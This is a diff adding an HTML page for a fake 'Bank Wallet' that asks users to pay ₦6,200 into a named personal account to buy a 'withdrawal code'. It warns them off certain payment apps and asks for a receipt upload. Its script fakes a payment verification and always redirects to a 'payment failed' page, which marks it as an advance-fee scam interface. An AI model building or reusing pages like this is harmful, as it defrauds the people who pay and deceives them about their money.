@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Buy Withdrawal Code - Bank Wallet</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+      }
+      .info-box {
+        background: #fff;
+        border-radius: 0.75rem;
+        padding: 1rem 1.2rem;
+        max-width: 420px;
+        width: 100%;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.06);
+        border: 1px solid #16a34a;
+      }
+      .info-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0.85rem 0;
+        border-bottom: 1px solid #e5e7eb;
+      }
+      .info-item:last-child {
+        border-bottom: none;
+      }
+      .label {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-weight: 700;
+        color: #111827;
+        font-size: 0.95rem;
+      }
+      .value {
+        font-weight: 400;
+        color: #374151;
+        font-size: 0.95rem;
+      }
+      .copy-btn {
+        background-color: #16a34a;
+        color: white;
+        border: none;
+        padding: 0.3rem 0.7rem;
+        border-radius: 0.4rem;
+        font-size: 0.8rem;
+        cursor: pointer;
+      }
+      .copy-btn:hover {
+        background-color: #15803d;
+      }
+      #paidBtn.disabled {
+        background-color: #9ca3af;
+        cursor: not-allowed;
+      }
+    </style>
+  </head>
+
+  <body
+    class="min-h-screen flex flex-col justify-start items-center bg-white dark:bg-black text-gray-900 dark:text-white px-6 py-10"
+  >
+    <!-- Logo -->
+    <div
+      class="w-20 h-20 rounded-2xl bg-green-600 flex items-center justify-center mb-6 mt-2"
+    >
+      <i class="fa-solid fa-landmark text-white text-3xl"></i>
+    </div>
+
+    <!-- Title -->
+    <h1 class="text-2xl font-bold text-center mb-2">Buy Withdrawal Code</h1>
+    <p class="text-center text-gray-500 dark:text-gray-400 mb-6">
+      <strong>Hello dear user kindly make a one time payment of ₦6,200 to purchase your personal code.
+⚠️Note : two users can not use same code to avoid being banned 🚫.
+    </p>
+
+    <!-- Payment Details -->
+    <div class="info-box mb-6">
+      <div class="info-item">
+        <span class="label"><i class="fa-solid fa-hashtag text-green-600"></i> Acc No</span>
+        <div class="flex items-center gap-2">
+          <span id="accNumber" class="value">0456709285</span>
+          <button class="copy-btn" onclick="copyAccNumber()">Copy</button>
+        </div>
+      </div>
+
+      <div class="info-item">
+        <span class="label"><i class="fa-solid fa-building-columns text-green-600"></i> Bank</span>
+        <span class="value">SMART CASH</span>
+      </div>
+
+      <div class="info-item">
+        <span class="label"><i class="fa-solid fa-user text-green-600"></i> Name</span>
+        <span class="value">IFEOMA PALIBO</span>
+      </div>
+
+      <div class="info-item">
+        <span class="label"><i class="fa-solid fa-wallet text-green-600"></i> Amount</span>
+        <span class="value font-semibold text-green-700">₦6,200</span>
+      </div>
+    </div>
+
+    <!-- Warning -->
+    <p class="text-xs text-center text-gray-700 dark:text-gray-300 mb-6 max-w-xs">
+      ⚠️ <b>Do not use Opay or Palmpay</b> for this payment.<br />
+      Use other banks (e.g., GTBank, Zenith, Access, etc.)
+    </p>
+
+    <!-- Upload Section -->
+    <div class="w-full max-w-sm flex flex-col items-center mb-4">
+      <label
+        for="receiptUpload"
+        class="w-full text-center bg-green-100 dark:bg-green-800 text-green-700 dark:text-green-100 font-semibold py-3 rounded-lg cursor-pointer border border-green-600 hover:bg-green-200 dark:hover:bg-green-700 transition"
+      >
+        <i class="fa-solid fa-upload mr-2"></i> Upload Payment Receipt
+      </label>
+      <input
+        type="file"
+        id="receiptUpload"
+        accept="image/*,application/pdf"
+        class="hidden"
+      />
+    </div>
+
+    <!-- I Have Paid Button (Disabled initially) -->
+    <button
+      id="paidBtn"
+      class="w-full max-w-xs bg-gray-400 text-white font-semibold py-3 rounded-lg transition text-sm disabled"
+      disabled
+    >
+      <i class="fa-solid fa-check-circle mr-2"></i> I Have Paid
+    </button>
+
+    <!-- Footer -->
+    <footer class="mt-16 text-center text-gray-500 dark:text-gray-400 text-sm">
+      Bank Wallet © 2025
+    </footer>
+
+    <script>
+      // Copy account number
+      function copyAccNumber() {
+        const acc = document.getElementById("accNumber").textContent;
+        navigator.clipboard.writeText(acc).then(() => {
+          Swal.fire({
+            toast: true,
+            position: "top",
+            icon: "success",
+            title: "Account number copied!",
+            showConfirmButton: false,
+            timer: 1800,
+          });
+        });
+      }
+
+      const uploadInput = document.getElementById("receiptUpload");
+      const paidBtn = document.getElementById("paidBtn");
+
+      // Enable button after receipt upload
+      uploadInput.addEventListener("change", () => {
+        if (uploadInput.files.length > 0) {
+          paidBtn.classList.remove("disabled");
+          paidBtn.disabled = false;
+          paidBtn.classList.remove("bg-gray-400");
+          paidBtn.classList.add("bg-green-600", "hover:bg-green-700");
+        }
+      });
+
+      // Handle "I Have Paid"
+      paidBtn.addEventListener("click", () => {
+        Swal.fire({
+          title: "Verifying Payment...",
+          text: "Please wait a moment.",
+          allowOutsideClick: false,
+          didOpen: () => Swal.showLoading(),
+        });
+
+        // Simulate 4-second verification
+        setTimeout(() => {
+          Swal.close();
+          window.location.href = "payment-failed.html";
+        }, 4000);
+      });
+
+      // Popup on page load
+      window.addEventListener("load", () => {
+        Swal.fire({
+          icon: "warning",
+          title: "Important Notice",
+          html: `
+            <p class='text-gray-700 text-sm'>
+              🚫 <b>Do not use Opay or Palmpay</b> for transfers.<br><br>
+              ✅ Use other banks like GTBank, Access, Zenith, etc.
+            </p>
+          `,
+          confirmButtonColor: "#22c55e",
+          confirmButtonText: "Got It",
+        });
+      });
+    </script>
+  </body>
+</html>
